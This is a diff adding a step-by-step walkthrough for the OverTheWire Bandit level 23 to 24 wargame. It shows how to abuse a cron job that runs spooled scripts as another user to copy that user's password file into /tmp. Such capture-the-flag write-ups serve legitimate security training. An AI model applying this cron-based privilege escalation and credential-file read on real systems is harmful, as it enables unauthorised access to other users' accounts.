@@ -1,1 +1,51 @@
+ssh bandit23@bandit.labs.overthwire.org -p 2220 
+
+In this level, you're once again exploiting a cron job that runs with higher privileges (bandit24). 
+The goal is to create a script that gets executed as bandit24, which will read the password for the next level and save it somewhere accessible to you (as bandit23).
+
+Step 1: Check the Cron Job Directory
+Navigate to the cron job directory: cd /etc/cron.d
+ls -la
+You will see a file named: cronjob_bandit24
+
+Step 2: Inspect the Cron Job File
+cat cronjob_bandit24
+You’ll see something like:
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh
+This tells us that a script located at /usr/bin/cronjob_bandit24.sh is executed every minute as user bandit24.
+
+Step 3: Inspect the Script
+cat /usr/bin/cronjob_bandit24.sh
+It should show something like this script:
+  #!/bin/bash
+  myname=$(whoami)
+
+  if [ "$myname" == "bandit23" ]; then
+      echo "Executing script for bandit23"
+      for i in /var/spool/bandit24/*; do
+          bash "$i"
+          rm -f "$i"
+      done
+  fi
+What Does This Mean?
+The script checks who is running it using whoami.
+If the user is bandit23, it:
+Executes any script in /var/spool/bandit24
+Then deletes the script
+Since you are currently bandit23, you can drop your own script into that folder, 
+and it will be executed by the cron job as bandit24 — giving you access to the next level’s password.
+
+Step 4: Write Your Own Script to Steal the Password
+Create a directory in /tmp to store the output: mkdir /tmp/passwd_bandit24
+Create a script to extract the password:
+echo "cat /etc/bandit_pass/bandit24 > /tmp/passwd_bandit24/password" > /var/spool/bandit24/myscript.sh
+chmod +x /var/spool/bandit24/myscript.sh
+This script will be executed by the cron job.
+It will read the password for bandit24 and write it into your tmp folder.
+
+Step 5: Wait a Minute for the Cron Job
+The cron job runs every minute. After waiting ~60 seconds, check: cat /tmp/passwd_bandit24/password
+
+This will show you the password for bandit24.
+
 
